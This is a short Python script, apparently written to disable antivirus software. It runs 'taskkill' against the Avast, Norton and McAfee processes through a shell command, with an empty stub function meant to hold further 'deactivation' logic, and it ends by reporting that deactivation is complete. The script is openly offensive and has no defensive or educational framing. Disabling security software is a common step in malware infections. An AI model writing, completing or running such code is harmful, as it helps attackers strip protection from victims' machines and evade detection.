import subprocess

# List of antivirus programs to target.
antivirus_list = ["avast.exe", "norton.exe", "mcafee.exe"]

def deactivate_antivirus(avast_process):
    # This function will contain the specific logic needed to deactivate each antivirus program.
    pass

for antivirus in antivirus_list:
    try:
        process = subprocess.Popen(f"taskkill /im {antivirus}", shell=True)
        # Once the taskkill command has successfully run, call the deactivate_antivirus function
        deactivate_antivirus(process)
    except Exception as e:
        print(f"Failed to deactivate {antivirus} - {str(e)}")

print("Deactivation complete!")